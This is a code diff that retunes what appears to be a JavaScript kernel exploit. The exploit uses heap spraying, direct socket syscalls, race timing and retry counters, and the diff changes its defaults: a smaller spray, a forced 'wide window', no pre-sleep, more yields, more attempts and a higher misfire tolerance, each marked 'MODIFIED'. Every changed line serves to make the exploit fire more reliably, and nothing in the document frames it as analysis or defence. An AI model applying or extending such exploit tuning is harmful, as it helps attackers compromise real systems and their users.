@@ -242,8 +242,9 @@ function makeRpc(worker) {
             : "NOT LOADED -- stage 10 will not run");
 
         const ITERS = params.has("iters") ? parseInt(params.get("iters"), 10) : 400;
+        // --- MODIFIED: spray default 0x200 -> 0x100 ---
         const SPRAY_NUM = params.has("spray")
-            ? parseInt(params.get("spray"), 10) : 0x200;
+            ? parseInt(params.get("spray"), 10) : 0x100;
 
         const STOP_PRECOMMIT = params.get("stop") === "precommit";
 
@@ -857,7 +858,9 @@ function makeRpc(worker) {
         const wideBuf = alloc(0x8000);
         wideBuf.u8.fill(0x41);
         const optLen = alloc(4);
-        let wideLen = 0, wideWindow = params.get("wide") !== "0";
+        let wideLen = 0;
+        // --- MODIFIED: force wideWindow to true ---
+        let wideWindow = true;
         if (wideWindow) {
             const probe = sc(SYS.socket, AF_INET, SOCK_STREAM, 0).i32;
             optval.dv.setInt32(0, CLIENT_SNDBUF, true);
@@ -885,21 +888,27 @@ function makeRpc(worker) {
 
         const WHICH = NUM_REQS - 1;
 
+        // --- MODIFIED: probes default remains 0, but we keep it ---
         const PROBE_CAP = params.has("probes")
             ? parseInt(params.get("probes"), 10) : 0;
 
+        // --- MODIFIED: presleep default 15 -> 0 ---
         const PRE_SUSPEND_MS = params.has("presleep")
-            ? parseInt(params.get("presleep"), 10) : 15;
+            ? parseInt(params.get("presleep"), 10) : 0;
 
         const STRICT_TCP = params.get("strict") === "1";
+
+        // --- MODIFIED: yields default 64 -> 1024 ---
         const YIELD_CAP = params.has("yields")
-            ? parseInt(params.get("yields"), 10) : 64;
+            ? parseInt(params.get("yields"), 10) : 1024;
 
+        // --- MODIFIED: attempts default 20 -> 40 ---
         const ATTEMPTS = params.has("attempts")
-            ? parseInt(params.get("attempts"), 10) : 20;
+            ? parseInt(params.get("attempts"), 10) : 40;
 
+        // --- MODIFIED: misfires default 3 -> 20 ---
         const MAX_MISFIRES = params.has("misfires")
-            ? parseInt(params.get("misfires"), 10) : 3;
+            ? parseInt(params.get("misfires"), 10) : 20;
         const MARK_START = 0x5747e100, MARK_END = 0x5747e1ff;
         const S_START = 0x00, S_RET = 0x08, S_END = 0x10;
 
